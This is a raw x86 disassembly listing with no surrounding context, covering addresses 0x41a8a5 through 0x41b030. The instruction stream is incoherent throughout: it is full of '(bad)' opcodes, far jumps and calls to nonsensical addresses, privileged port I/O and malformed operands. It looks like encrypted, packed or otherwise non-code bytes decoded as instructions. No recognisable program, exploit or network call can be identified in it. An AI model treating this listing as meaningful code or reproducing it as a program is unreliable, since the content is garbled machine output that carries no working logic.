  41a8a5:	mov    eax,ds:0xaeea5603
  41a8aa:	mov    esp,0x4c94053f
  41a8af:	jl     0x41a8fe
  41a8b1:	dec    esi
  41a8b2:	cmp    dl,BYTE PTR [eax+0x0]
  41a8b5:	or     eax,0xd64f9a1a
  41a8ba:	mov    edx,eax
  41a8bc:	xor    ch,dl
  41a8be:	cmp    al,cl
  41a8c0:	inc    ecx
  41a8c1:	fsub   st,st(2)
  41a8c3:	ins    DWORD PTR es:[edi],dx
  41a8c4:	cmp    BYTE PTR [ebx-0x52],cl
  41a8c7:	mov    ebp,DWORD PTR [esi+0x37eee94a]
  41a8cd:	scas   eax,DWORD PTR es:[edi]
  41a8ce:	jle    0x41a8fd
  41a8d0:	inc    edx
  41a8d1:	repnz push esp
  41a8d3:	push   0xf507bf1d
  41a8d8:	aaa    
  41a8d9:	mov    esp,0x1af33e07
  41a8de:	dec    edi
  41a8df:	es (bad) 
  41a8e1:	pop    ebp
  41a8e2:	cli    
  41a8e3:	mov    edi,0x7f4696c
  41a8e8:	ins    DWORD PTR es:[edi],dx
  41a8e9:	jmp    0xfc3591f0
  41a8ee:	jno    0x41a8cc
  41a8f0:	das    
  41a8f1:	call   0x60e90a79
  41a8f6:	add    BYTE PTR [ebx-0x41],ch
  41a8f9:	pop    ss
  41a8fa:	xchg   ecx,eax
  41a8fb:	es dec eax
  41a8fd:	pushf  
  41a8fe:	jae    0x41a965
  41a900:	add    al,0x3
  41a902:	xor    eax,0x18c2d91a
  41a907:	(bad)  [ebp-0x18]
  41a90a:	xor    bl,dl
  41a90c:	sub    al,0x9e
  41a90e:	inc    edx
  41a90f:	(bad)  
  41a910:	in     al,0x83
  41a912:	xor    al,0x29
  41a914:	and    al,BYTE PTR [ecx+ebp*2]
  41a917:	fsubr  DWORD PTR [edi+ebx*2]
  41a91a:	aad    0x16
  41a91c:	inc    ebp
  41a91d:	das    
  41a91e:	sub    dl,0x6
  41a921:	dec    ebx
  41a922:	pop    es
  41a923:	aad    0x7
  41a925:	sbb    al,0x12
  41a927:	pop    ebp
  41a928:	addr16 (bad) 
  41a92a:	(bad)  
  41a92b:	pop    ebp
  41a92c:	leave  
  41a92d:	pop    esp
  41a92e:	int3   
  41a92f:	jecxz  0x41a8ba
  41a931:	push   ds
  41a932:	idiv   esi
  41a934:	sub    BYTE PTR [ebx+0x24394dfe],dh
  41a93a:	sar    DWORD PTR [ebp-0x77101f58],0x8
  41a941:	xor    esi,DWORD PTR [ebx+eiz*1+0x4316b20f]
  41a948:	cmp    eax,0x78aa1998
  41a94d:	ret    
  41a94e:	cli    
  41a94f:	cmp    ah,BYTE PTR [edx+eiz*2+0x47]
  41a953:	inc    esi
  41a954:	push   ecx
  41a955:	sar    DWORD PTR [esi],1
  41a957:	xor    al,0x67
  41a959:	jle    0x41a98a
  41a95b:	jl     0x41a98b
  41a95d:	loope  0x41a96c
  41a95f:	or     eax,0xb2aeb83a
  41a964:	mov    eax,0x7318dd5
  41a969:	or     al,0x4b
  41a96b:	rol    DWORD PTR [esp+eax*4-0x3ecb8aad],0x6d
  41a973:	(bad)  [ecx]
  41a975:	and    DWORD PTR [esi+0x2d842d45],0x70
  41a97c:	cmp    edx,DWORD PTR [eax]
  41a97e:	pop    edx
  41a97f:	xor    BYTE PTR cs:[edx+0x7e5156cf],ch
  41a986:	mov    edx,0x80a2a1fa
  41a98b:	test   eax,0x81665e94
  41a990:	ds jp  0x41a9cf
  41a993:	ss cs dec ebx
  41a996:	pop    eax
  41a997:	jo     0x41aa17
  41a999:	cwde   
  41a99a:	mov    ecx,0x9dfe87e
  41a99f:	and    esi,ebx
  41a9a1:	loope  0x41aa0b
  41a9a3:	bound  eax,QWORD PTR ds:0x7e4be9d5
  41a9a9:	or     DWORD PTR [esi+0x6d],0x5ece06ab
  41a9b0:	cmp    DWORD PTR [esp+edx*2+0x6c],edx
  41a9b4:	outs   dx,DWORD PTR ds:[esi]
  41a9b5:	in     al,dx
  41a9b6:	cmp    eax,0x6acdcd7c
  41a9bb:	mov    dl,0xa8
  41a9bd:	popa   
  41a9be:	je     0x41a960
  41a9c0:	push   0xe981842a
  41a9c5:	fdivr  st(5),st
  41a9c7:	add    dh,al
  41a9c9:	xchg   ecx,eax
  41a9ca:	xchg   ebp,eax
  41a9cb:	jnp    0x41a9d3
  41a9cd:	leave  
  41a9ce:	and    DWORD PTR [edi],eax
  41a9d0:	pusha  
  41a9d1:	std    
  41a9d2:	mov    ecx,DWORD PTR [esi-0x34bce3b9]
  41a9d8:	aad    0x4a
  41a9da:	test   DWORD PTR [esi+0x3f],0xeece99a9
  41a9e1:	jnp    0x41a9af
  41a9e3:	popf   
  41a9e4:	rcl    DWORD PTR [ecx+eiz*2-0x6c],1
  41a9e8:	pop    ds
  41a9e9:	dec    edx
  41a9ea:	dec    ebp
  41a9eb:	sub    eax,0x8e411f7f
  41a9f0:	xor    eax,0xeb1e1c69
  41a9f5:	(bad)  
  41a9f6:	dec    ecx
  41a9f7:	jns    0x41aa23
  41a9f9:	jecxz  0x41a9f9
  41a9fb:	mov    edi,edx
  41a9fd:	ins    DWORD PTR es:[edi],dx
  41a9fe:	adc    dh,BYTE PTR [eax-0x44]
  41aa01:	pushf  
  41aa02:	into   
  41aa03:	imul   ecx,DWORD PTR [ebp+esi*1+0x1d],0xca6ed6c0
  41aa0b:	pop    ecx
  41aa0c:	sub    al,0x3
  41aa0e:	shl    BYTE PTR [ebp+0xa8fa078],1
  41aa14:	cmp    ah,BYTE PTR [edx-0x23aa21ce]
  41aa1a:	add    al,bh
  41aa1c:	arpl   WORD PTR [edi],bx
  41aa1e:	(bad)  
  41aa1f:	mov    bh,0xad
  41aa21:	fistp  QWORD PTR [esi-0x44]
  41aa24:	aas    
  41aa25:	lock lahf 
  41aa27:	es icebp 
  41aa29:	pushf  
  41aa2a:	jno    0x41aa28
  41aa2c:	add    ebp,ebp
  41aa2e:	mov    dh,BYTE PTR ds:0x732417e1
  41aa34:	jg     0x41aaaa
  41aa36:	outs   dx,BYTE PTR ds:[esi]
  41aa37:	int3   
  41aa38:	dec    esi
  41aa39:	cmc    
  41aa3a:	add    esp,DWORD PTR [eax]
  41aa3c:	imul   edi,DWORD PTR [eax],0x7d
  41aa3f:	mov    WORD PTR [edx-0x6f7ec652],?
  41aa45:	shl    dl,1
  41aa47:	inc    ebp
  41aa48:	repz cmp DWORD PTR [eax+ebp*1],ebp
  41aa4c:	nop
  41aa4d:	pop    ss
  41aa4e:	pushf  
  41aa4f:	loopne 0x41aa32
  41aa51:	push   ebp
  41aa52:	mov    edi,0x588cf7b9
  41aa57:	push   edi
  41aa58:	cmp    ah,bl
  41aa5a:	push   esp
  41aa5b:	jmp    0x763af2e1
  41aa60:	and    al,0xe4
  41aa62:	repz jo 0x41aa0c
  41aa65:	in     al,dx
  41aa66:	loop   0x41aa2c
  41aa68:	out    dx,al
  41aa69:	xor    BYTE PTR [ebx+0x2df6f6a9],bl
  41aa6f:	outs   dx,DWORD PTR ds:[esi]
  41aa70:	jno    0x41aa4a
  41aa72:	mov    esi,0x23cef90d
  41aa77:	xor    dl,BYTE PTR [esi]
  41aa79:	push   ss
  41aa7a:	fild   QWORD PTR [ebx-0x27c0ab79]
  41aa80:	inc    ebx
  41aa81:	or     al,0x92
  41aa83:	dec    eax
  41aa84:	push   ss
  41aa85:	aam    0x12
  41aa87:	dec    edi
  41aa88:	sub    eax,0x39fe9abc
  41aa8d:	in     eax,dx
  41aa8e:	loope  0x41aa4c
  41aa90:	xlat   BYTE PTR ds:[ebx]
  41aa91:	xchg   ebx,eax
  41aa92:	adc    dl,BYTE PTR [ecx-0x64]
  41aa95:	repnz inc ebp
  41aa97:	repnz and eax,0xb693dbc0
  41aa9d:	jne    0x41aa66
  41aa9f:	sbb    DWORD PTR [ebx],ecx
  41aaa1:	jmp    0x41ab1d
  41aaa3:	imul   ecx,DWORD PTR [eax+0x6c6050d3],0xf6ce52c9
  41aaad:	in     eax,0x45
  41aaaf:	or     al,0x7a
  41aab1:	push   0x49518061
  41aab6:	xchg   esi,eax
  41aab7:	cwde   
  41aab8:	gs sti 
  41aaba:	pushf  
  41aabb:	jmp    0xd0b:0x761ca8e
  41aac2:	(bad)  
  41aac4:	outs   dx,BYTE PTR ds:[esi]
  41aac5:	retf   0x78e7
  41aac8:	imul   BYTE PTR [ebx-0x5b]
  41aacb:	out    0x59,eax
  41aacd:	pop    ebx
  41aace:	fadd   st,st(6)
  41aad0:	sbb    eax,0xf675c374
  41aad5:	(bad)  
  41aad6:	push   edx
  41aad7:	dec    ebp
  41aad8:	ds mov al,0xaa
  41aadb:	(bad)  
  41aadd:	jecxz  0x41aa67
  41aadf:	jo     0x41aa95
  41aae1:	shl    BYTE PTR [ecx-0x4b6342d2],0x28
  41aae8:	je     0x269c5db0
  41aaee:	pop    esp
  41aaef:	xor    eax,0xce663af3
  41aaf4:	scas   al,BYTE PTR es:[edi]
  41aaf5:	xchg   esi,eax
  41aaf6:	pop    edi
  41aaf7:	daa    
  41aaf8:	pusha  
  41aaf9:	pop    esi
  41aafa:	and    edi,DWORD PTR [eax+eiz*8-0x2b54a90b]
  41ab01:	arpl   WORD PTR [ecx],ax
  41ab03:	push   ecx
  41ab04:	ret    0x3f02
  41ab07:	or     eax,ebp
  41ab09:	call   0xcc30cdf1
  41ab0e:	dec    esp
  41ab0f:	mov    dh,0x1f
  41ab11:	mov    al,BYTE PTR [esi+edi*4]
  41ab14:	dec    edx
  41ab15:	jmp    0xaa48:0x6f88ef0b
  41ab1c:	enter  0xfd3f,0x8
  41ab20:	(bad)  
  41ab21:	outs   dx,DWORD PTR ds:[esi]
  41ab22:	xor    ch,BYTE PTR [ebx+0x634aaa77]
  41ab28:	adc    DWORD PTR [eax+0x68d843db],ebx
  41ab2e:	fidiv  DWORD PTR [edi]
  41ab30:	call   0xeb29:0xd1d1c2ca
  41ab37:	add    bl,dl
  41ab39:	cmp    DWORD PTR [edx+edx*1],ebp
  41ab3c:	cs dec ebp
  41ab3e:	adc    eax,0xda23f327
  41ab43:	scas   eax,DWORD PTR es:[edi]
  41ab44:	adc    edi,esp
  41ab46:	das    
  41ab47:	out    dx,eax
  41ab48:	cmp    ebp,DWORD PTR [eax+0x45]
  41ab4b:	scas   al,BYTE PTR es:[edi]
  41ab4c:	jmp    0xf4f2cb68
  41ab51:	fwait
  41ab52:	sub    ebp,DWORD PTR [edi+0x62]
  41ab55:	push   esi
  41ab56:	xlat   BYTE PTR ds:[ebx]
  41ab57:	ins    BYTE PTR es:[edi],dx
  41ab58:	mov    edx,0x27b49a64
  41ab5d:	fs pop ss
  41ab5f:	stc    
  41ab60:	iret   
  41ab61:	(bad)  
  41ab62:	lock cdq 
  41ab64:	lea    edi,[edx]
  41ab66:	mov    ecx,0x1638d0e9
  41ab6b:	mov    esp,0x1e9685eb
  41ab70:	push   esp
  41ab71:	aam    0xed
  41ab73:	xchg   edi,eax
  41ab74:	mov    esp,0xa1febcd9
  41ab79:	fcomp  QWORD PTR [ebp-0x38e46280]
  41ab7f:	xlat   BYTE PTR ds:[ebx]
  41ab80:	xor    eax,0xb83d0249
  41ab85:	and    DWORD PTR [edx+0x7f],0xd58fc7ad
  41ab8c:	push   ebx
  41ab8d:	sub    eax,0x2b001d0e
  41ab92:	imul   ecx,DWORD PTR [bx+si],0xfbad299f
  41ab99:	push   0x11
  41ab9b:	sub    bl,BYTE PTR [esp+ecx*1+0x2866c600]
  41aba2:	pushf  
  41aba3:	mov    esi,0x4f93a2ba
  41aba8:	ins    DWORD PTR es:[edi],dx
  41aba9:	loopne 0x41ab60
  41abab:	cmp    eax,0x255301ec
  41abb0:	mov    bh,0x5e
  41abb2:	loope  0x41ab7c
  41abb4:	push   0x57
  41abb6:	stos   DWORD PTR es:[edi],eax
  41abb7:	imul   ebx,DWORD PTR [esi],0x9cb1cc08
  41abbd:	or     DWORD PTR [edx],edi
  41abbf:	adc    bh,BYTE PTR [esi]
  41abc1:	xchg   BYTE PTR [ebp-0x7f55523e],ah
  41abc7:	mov    ah,0xe8
  41abc9:	(bad)  
  41abcb:	inc    edi
  41abcc:	aas    
  41abcd:	sub    al,BYTE PTR [ebx-0x17]
  41abd0:	jnp    0x41ab8e
  41abd2:	enter  0x6793,0xfb
  41abd6:	out    dx,al
  41abd7:	jp     0x41abf7
  41abd9:	rol    DWORD PTR [edx-0x4d],0xe0
  41abdd:	outs   dx,DWORD PTR ds:[esi]
  41abde:	xchg   esp,eax
  41abdf:	sti    
  41abe0:	imul   ecx,DWORD PTR [edx-0x37650145],0x59
  41abe7:	inc    eax
  41abe8:	cmp    DWORD PTR [edi+eax*8],eax
  41abeb:	and    edx,DWORD PTR [esi+0x34d94d39]
  41abf1:	mov    esp,0xaf88178
  41abf6:	test   DWORD PTR [ebx+eax*4],0x9bff6ef4
  41abfd:	add    eax,0xe0b8bb5a
  41ac02:	dec    edx
  41ac03:	inc    eax
  41ac04:	pop    ss
  41ac05:	repz pop es
  41ac07:	iret   
  41ac08:	sub    ch,BYTE PTR [esi-0x3f92627a]
  41ac0e:	cmp    eax,0xddeeaeca
  41ac13:	outs   dx,DWORD PTR ds:[esi]
  41ac14:	inc    esp
  41ac15:	ss fs jne 0x41ac67
  41ac19:	inc    esp
  41ac1a:	sub    eax,DWORD PTR [ebx+0x18]
  41ac1d:	mov    edi,0xe03dd2dc
  41ac22:	mov    bl,0xe2
  41ac24:	psadbw mm3,QWORD PTR [edi-0x705316c]
  41ac2b:	mov    ah,BYTE PTR [edx+0x66]
  41ac2e:	arpl   WORD PTR [ebp-0x12],cx
  41ac31:	(bad)  
  41ac32:	mov    ah,BYTE PTR [ebx]
  41ac34:	xchg   edx,eax
  41ac35:	jmp    0x41acb4
  41ac37:	push   0x7c3e9e5e
  41ac3c:	std    
  41ac3d:	push   ds
  41ac3e:	sbb    al,ch
  41ac40:	clc    
  41ac41:	ja     0x41ac38
  41ac43:	cmp    ch,BYTE PTR [ebx+0x75]
  41ac46:	cli    
  41ac47:	mov    ebx,0x10cae8bb
  41ac4c:	repnz shr DWORD PTR [edi-0x2a237f59],0xed
  41ac54:	mov    BYTE PTR [esi+0x3941d342],bh
  41ac5a:	pop    esi
  41ac5b:	mov    esp,0x8fc933af
  41ac60:	and    eax,0xe5e8f80d
  41ac65:	or     BYTE PTR [edx],dh
  41ac67:	cmp    bl,BYTE PTR [ebx-0x50]
  41ac6a:	pusha  
  41ac6b:	mov    ecx,0x4d1bfd3a
  41ac70:	mov    cl,0xae
  41ac72:	cdq    
  41ac73:	pop    esi
  41ac74:	and    BYTE PTR [edx-0x1415436a],0x5f
  41ac7b:	rcr    DWORD PTR [edi+ecx*4+0x2b],cl
  41ac7f:	nop
  41ac80:	popa   
  41ac81:	add    dh,BYTE PTR [edx+edx*2+0x79ff600a]
  41ac88:	loop   0x41ac0a
  41ac8a:	in     al,0xd5
  41ac8c:	sub    BYTE PTR [ecx+eax*4],0x1f
  41ac90:	out    dx,eax
  41ac91:	push   ss
  41ac92:	sbb    esi,DWORD PTR [edi-0x5f]
  41ac95:	sub    al,0x59
  41ac97:	sti    
  41ac98:	ss pop edx
  41ac9b:	in     al,0xb1
  41ac9d:	pop    ebp
  41ac9e:	add    al,ah
  41aca0:	mov    ?,WORD PTR [esi+0x2fbc74aa]
  41aca6:	(bad)  
  41aca7:	fxch   st(7)
  41aca9:	and    DWORD PTR [esi],esp
  41acab:	std    
  41acac:	and    ebp,edi
  41acae:	mov    dh,0x30
  41acb0:	mov    esp,ebp
  41acb2:	les    ecx,FWORD PTR [ebx-0x34b3e8c6]
  41acb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acb9:	or     DWORD PTR [esi-0x51],edi
  41acbc:	shr    DWORD PTR ds:0x624c5ede,0x4a
  41acc3:	cmp    bh,0x37
  41acc6:	mov    ebp,0xbbe529ed
  41accb:	jo     0x41acc8
  41accd:	and    eax,0xfffffff4
  41acd0:	cmp    al,0x54
  41acd2:	in     eax,0xbb
  41acd4:	or     DWORD PTR [edx-0x3],edx
  41acd7:	lahf   
  41acd8:	cli    
  41acd9:	jae    0x41ad01
  41acdb:	rcr    BYTE PTR [eax-0x72],0xfc
  41acdf:	adc    esp,DWORD PTR ds:0x2885890a
  41ace5:	loopne 0x41ad3c
  41ace7:	idiv   BYTE PTR [eax]
  41ace9:	dec    edi
  41acea:	sub    al,0xc7
  41acec:	outs   dx,DWORD PTR ds:[esi]
  41aced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acee:	push   ecx
  41acef:	sahf   
  41acf0:	xor    eax,0x793b3f81
  41acf5:	outs   dx,DWORD PTR ds:[esi]
  41acf6:	push   eax
  41acf7:	ja     0x41ad35
  41acf9:	(bad)  
  41acfa:	jle    0x41ace9
  41acfc:	and    al,0x66
  41acfe:	daa    
  41acff:	sub    DWORD PTR [esi],0x23baaeca
  41ad05:	sbb    edi,DWORD PTR [eax-0x2c7f1d69]
  41ad0b:	inc    edx
  41ad0c:	scas   al,BYTE PTR es:[edi]
  41ad0d:	mov    dl,0x37
  41ad0f:	inc    ecx
  41ad10:	test   eax,0x880301d
  41ad15:	out    dx,al
  41ad16:	(bad)  
  41ad17:	ficom  DWORD PTR [ecx]
  41ad19:	inc    eax
  41ad1a:	repz test DWORD PTR [ecx+0x21],ebp
  41ad1e:	daa    
  41ad1f:	add    esi,DWORD PTR [ebx]
  41ad21:	cmp    DWORD PTR ds:0x323c41a0,ebp
  41ad27:	and    dh,BYTE PTR [edi]
  41ad29:	out    dx,eax
  41ad2a:	pushf  
  41ad2b:	jb     0x41ad20
  41ad2d:	mov    al,0x98
  41ad2f:	pop    ecx
  41ad30:	cli    
  41ad31:	inc    esi
  41ad32:	std    
  41ad33:	leave  
  41ad34:	enter  0x6ccf,0xab
  41ad38:	sub    bl,BYTE PTR [eax]
  41ad3a:	or     ebp,DWORD PTR ds:0x7c5e456d
  41ad40:	adc    BYTE PTR ds:[ebx+0x138dfe3d],bh
  41ad47:	push   ebx
  41ad48:	dec    ecx
  41ad49:	inc    BYTE PTR [ebx]
  41ad4b:	cmp    al,bl
  41ad4d:	mov    ebx,0x1d0e3c04
  41ad52:	stc    
  41ad53:	cwde   
  41ad54:	mov    ds:0x28f3dc1f,al
  41ad59:	pop    esi
  41ad5a:	cld    
  41ad5b:	or     al,0x36
  41ad5d:	xchg   edx,eax
  41ad5e:	popf   
  41ad5f:	push   ss
  41ad60:	adc    BYTE PTR [edx+0x6f267880],cl
  41ad66:	pop    es
  41ad67:	adc    al,0x2b
  41ad69:	loopne 0x41ad6b
  41ad6b:	aaa    
  41ad6c:	cmp    al,0xe9
  41ad6e:	mov    esi,0x73ebee1b
  41ad73:	aam    0x4b
  41ad75:	aam    0xee
  41ad77:	(bad)  
  41ad78:	adc    al,dh
  41ad7a:	fadd   QWORD PTR [ebx-0x6826d7de]
  41ad80:	adc    BYTE PTR ds:0x906df672,ah
  41ad86:	stos   DWORD PTR es:[edi],eax
  41ad87:	pop    es
  41ad88:	cld    
  41ad89:	mov    cl,dh
  41ad8b:	arpl   ax,di
  41ad8d:	mov    ch,0xc1
  41ad8f:	push   ecx
  41ad90:	imul   ebx,ebx,0x56
  41ad93:	xor    edi,DWORD PTR [edi-0x3792130a]
  41ad99:	add    BYTE PTR cs:[edx],ch
  41ad9c:	inc    ebp
  41ad9d:	and    DWORD PTR [eax-0x47bae37a],ebp
  41ada3:	dec    ebp
  41ada4:	xchg   ebx,eax
  41ada5:	mov    eax,0x1f892274
  41adaa:	mov    ebp,edi
  41adac:	mov    esp,0xe0cc4f16
  41adb1:	in     eax,dx
  41adb2:	push   ss
  41adb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adb4:	scas   al,BYTE PTR es:[edi]
  41adb5:	push   ds
  41adb6:	add    ecx,edx
  41adb8:	sbb    DWORD PTR [ebx-0x76d74f70],edi
  41adbe:	aad    0x56
  41adc0:	mov    eax,ds:0xe2a3fc1b
  41adc5:	mov    eax,0xa21e2220
  41adca:	jbe    0x41ad7c
  41adcc:	fld    TBYTE PTR [edx]
  41adce:	mov    edx,0x74c30f57
  41add3:	repnz cmp edi,edx
  41add6:	stos   DWORD PTR es:[edi],eax
  41add7:	sub    DWORD PTR [edx],ebx
  41add9:	push   gs
  41addb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41addc:	mov    dh,0xc4
  41adde:	paddw  mm5,QWORD PTR [edi-0x3bb369e5]
  41ade5:	loope  0x41adce
  41ade7:	adc    cl,BYTE PTR [edi+0x642649f4]
  41aded:	and    DWORD PTR [ebx-0x467210f8],edx
  41adf3:	or     al,0xd7
  41adf5:	call   0x346880c8
  41adfa:	dec    ebx
  41adfb:	push   0x8f96b2a1
  41ae00:	and    eax,0x85a0ea2e
  41ae05:	pop    eax
  41ae06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae07:	in     eax,0x18
  41ae09:	push   ss
  41ae0a:	adc    ebx,DWORD PTR [ebx]
  41ae0c:	pop    ebx
  41ae0d:	outs   dx,BYTE PTR ds:[esi]
  41ae0e:	call   0xae6d8635
  41ae13:	ret    
  41ae14:	daa    
  41ae15:	xchg   edx,eax
  41ae16:	cld    
  41ae17:	das    
  41ae18:	and    ebx,DWORD PTR [esi+0x7113b5c2]
  41ae1e:	fistp  DWORD PTR [edi+ecx*2]
  41ae21:	cmp    bl,BYTE PTR [esp+esi*8]
  41ae24:	leave  
  41ae25:	sbb    bh,dl
  41ae27:	js     0x41adbb
  41ae29:	pop    ebx
  41ae2a:	cld    
  41ae2b:	mov    eax,ds:0x48b96c22
  41ae30:	pop    ds
  41ae31:	fdivrp st(1),st
  41ae33:	jmp    0x894633a2
  41ae38:	jae    0x41ae4c
  41ae3a:	adc    bl,BYTE PTR [edx-0x20]
  41ae3d:	jns    0x41ae89
  41ae3f:	jg     0x41add9
  41ae41:	call   0x59276f9f
  41ae46:	sbb    DWORD PTR [edi],esi
  41ae48:	in     al,dx
  41ae49:	pusha  
  41ae4a:	aas    
  41ae4b:	jp     0x41ae44
  41ae4d:	sub    cl,BYTE PTR [esi+ebp*8+0x3f51d9ea]
  41ae54:	out    dx,al
  41ae55:	repz jle 0x41ae45
  41ae58:	pop    ebp
  41ae59:	ficomp WORD PTR [ecx+0x71]
  41ae5c:	xchg   esi,eax
  41ae5d:	xchg   ebp,eax
  41ae5e:	std    
  41ae5f:	pushf  
  41ae60:	push   ds
  41ae61:	xchg   ebp,eax
  41ae62:	xchg   edi,eax
  41ae63:	or     ch,cl
  41ae65:	out    0x4d,al
  41ae67:	cmp    ebp,ebp
  41ae69:	test   DWORD PTR [edx+0x60],edi
  41ae6c:	shr    edi,1
  41ae6e:	cmp    bh,dl
  41ae70:	mov    edi,0x48e0f476
  41ae75:	adc    al,0x90
  41ae77:	fadd   DWORD PTR [ebx+edi*1+0x56]
  41ae7b:	or     al,0x1f
  41ae7d:	inc    edx
  41ae7e:	adc    eax,0xce96ee1e
  41ae83:	xchg   edx,eax
  41ae84:	lds    ecx,FWORD PTR [edx+0x181f57ad]
  41ae8a:	jbe    0x41ae6f
  41ae8c:	jns    0x41aed8
  41ae8e:	stos   BYTE PTR es:[edi],al
  41ae8f:	sub    BYTE PTR [ebx+0x375a44ff],bl
  41ae95:	jb     0x41aefa
  41ae97:	jecxz  0x41ae63
  41ae99:	pop    es
  41ae9a:	enter  0x62f4,0x2b
  41ae9e:	test   DWORD PTR [esi+0x7e],esp
  41aea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea2:	sbb    al,0x7f
  41aea4:	test   DWORD PTR [edi+0x7bb5a606],edx
  41aeaa:	out    0x89,eax
  41aeac:	xchg   esp,eax
  41aead:	fidivr DWORD PTR [edx+0x26fa13c7]
  41aeb3:	sub    BYTE PTR [ecx],bl
  41aeb5:	xchg   edx,eax
  41aeb6:	and    dh,0x81
  41aeb9:	fcom   DWORD PTR [ecx]
  41aebb:	out    0x23,al
  41aebd:	cdq    
  41aebe:	xlat   BYTE PTR ds:[ebx]
  41aebf:	bswap  esp
  41aec1:	pushf  
  41aec2:	pop    edi
  41aec3:	inc    edx
  41aec4:	rol    BYTE PTR ss:[ebx],0x43
  41aec8:	mul    BYTE PTR [eax]
  41aeca:	dec    ecx
  41aecb:	pop    es
  41aecc:	inc    eax
  41aecd:	aad    0x6f
  41aecf:	imul   esp,DWORD PTR [eax+0x49],0x3cfa823d
  41aed6:	jmp    0xedf5fe0
  41aedb:	imul   ebx,esp,0x2206f67c
  41aee1:	cmp    bl,ch
  41aee3:	push   ds
  41aee4:	cmp    DWORD PTR [eax-0x1d],edx
  41aee7:	push   ds
  41aee8:	jae    0x41af36
  41aeea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeeb:	test   DWORD PTR [ecx-0x1b0566c4],0xb88438b6
  41aef5:	nop
  41aef6:	mov    dl,0xf6
  41aef8:	faddp  st(0),st
  41aefa:	fdiv   st,st(3)
  41aefc:	dec    edx
  41aefd:	retf   0x2bef
  41af00:	xor    BYTE PTR [esi],0xe3
  41af03:	jl     0x41af25
  41af05:	push   eax
  41af06:	jmp    esi
  41af08:	test   al,0x3b
  41af0a:	and    DWORD PTR [ecx+0x57c85d87],0x6b4c7f0
  41af14:	test   BYTE PTR [esp+ebx*4],ah
  41af17:	inc    edi
  41af18:	xor    bl,cl
  41af1a:	mov    edi,DWORD PTR [ebx-0x56]
  41af1d:	push   ds
  41af1e:	mov    ds:0x84122c6e,al
  41af23:	sub    BYTE PTR [eax+ebp*8-0x6dc528aa],ch
  41af2a:	push   eax
  41af2b:	jns    0x41af50
  41af2d:	sar    ebp,1
  41af2f:	jnp    0x41af26
  41af31:	and    al,0x2e
  41af33:	mov    edi,0x8974625e
  41af38:	jl     0x41af9d
  41af3a:	rol    bl,1
  41af3c:	add    BYTE PTR [ebx-0x47046daf],ah
  41af42:	shr    DWORD PTR [edx+0x47fc431],0x20
  41af49:	test   DWORD PTR [edi-0x1695d21e],ebp
  41af4f:	xor    BYTE PTR [ebp-0x4cfe7f9a],ah
  41af55:	cs lahf 
  41af57:	mov    ebp,0x764f5708
  41af5c:	sar    BYTE PTR [ebx+esi*4],1
  41af5f:	int3   
  41af60:	ret    
  41af61:	xchg   ecx,eax
  41af62:	mov    eax,ds:0xfe7f981a
  41af67:	inc    eax
  41af68:	in     al,dx
  41af69:	inc    esp
  41af6a:	dec    ebp
  41af6b:	sub    DWORD PTR [eax+0x5f],eax
  41af6e:	stc    
  41af6f:	jmp    0xfdf6:0xb7bd94af
  41af76:	jns    0x41aefa
  41af78:	cmp    eax,0xd516d968
  41af7d:	les    eax,FWORD PTR [eax]
  41af7f:	loope  0x41afc0
  41af81:	inc    edx
  41af82:	call   0xf3f14ce0
  41af87:	js     0x41afca
  41af89:	mov    esp,0x53f49aea
  41af8e:	sub    BYTE PTR [edx],dh
  41af90:	inc    ecx
  41af91:	test   al,0xe9
  41af93:	inc    edi
  41af94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af95:	push   cs
  41af96:	nop
  41af97:	pop    ecx
  41af98:	xchg   esp,eax
  41af99:	push   ebx
  41af9a:	iret   
  41af9b:	add    eax,0x83393a70
  41afa0:	sub    eax,0xd147471
  41afa5:	ret    
  41afa6:	dec    ebp
  41afa7:	repz xchg edi,eax
  41afa9:	(bad)  
  41afaa:	sbb    DWORD PTR [eax+0x17],ebx
  41afad:	mov    bh,0x9e
  41afaf:	imul   edi,DWORD PTR [edi+0x30],0x17
  41afb3:	popa   
  41afb4:	ins    DWORD PTR es:[edi],dx
  41afb5:	pop    ecx
  41afb6:	sub    ebp,esp
  41afb8:	aam    0xad
  41afba:	fs popf 
  41afbc:	xor    eax,edx
  41afbe:	ins    BYTE PTR es:[edi],dx
  41afbf:	xchg   ebx,eax
  41afc0:	ja     0x41afc9
  41afc2:	cs jne 0x41b018
  41afc5:	and    ch,bh
  41afc7:	pop    ebp
  41afc8:	fsub   QWORD PTR [ecx-0x26]
  41afcb:	imul   esi,DWORD PTR [esi-0x52],0xffffffc3
  41afcf:	xor    DWORD PTR [edx],ebx
  41afd1:	xlat   BYTE PTR ds:[ebx]
  41afd2:	imul   esi,edx,0xda9e1e21
  41afd8:	call   0xb3e4647e
  41afdd:	pop    edx
  41afde:	call   DWORD PTR [esi-0x1f]
  41afe1:	jg     0x41b032
  41afe3:	cmp    BYTE PTR [ecx+edi*4-0x5b],bl
  41afe7:	ss ins DWORD PTR es:[edi],dx
  41afe9:	lea    edi,[ecx+0x60]
  41afec:	ins    BYTE PTR es:[edi],dx
  41afed:	jl     0x41b024
  41afef:	inc    eax
  41aff0:	loop   0x41afa4
  41aff2:	xor    DWORD PTR [ebp-0x7e],ecx
  41aff5:	and    DWORD PTR [ebp-0x74],eax
  41aff8:	call   0xae73:0x342bf531
  41afff:	(bad)  
  41b000:	fs hlt 
  41b002:	ss add ecx,esp
  41b005:	or     ecx,DWORD PTR [esi-0x495d4023]
  41b00b:	stos   BYTE PTR es:[edi],al
  41b00c:	repz adc eax,0xd760dd67
  41b012:	imul   dh
  41b014:	inc    esi
  41b015:	icebp  
  41b016:	outs   dx,DWORD PTR gs:[esi]
  41b018:	cmp    al,0x24
  41b01a:	cld    
  41b01b:	rcr    ah,0xe3
  41b01e:	adc    DWORD PTR [ecx],esi
  41b020:	jg     0x41afc6
  41b022:	push   ss
  41b023:	cwde   
  41b024:	and    al,0x5d
  41b026:	psubb  mm6,QWORD PTR ds:0x834d6a3e
  41b02d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b02e:	jno    0x41afcb
  41b030:	or     eax,0x8186e2a7
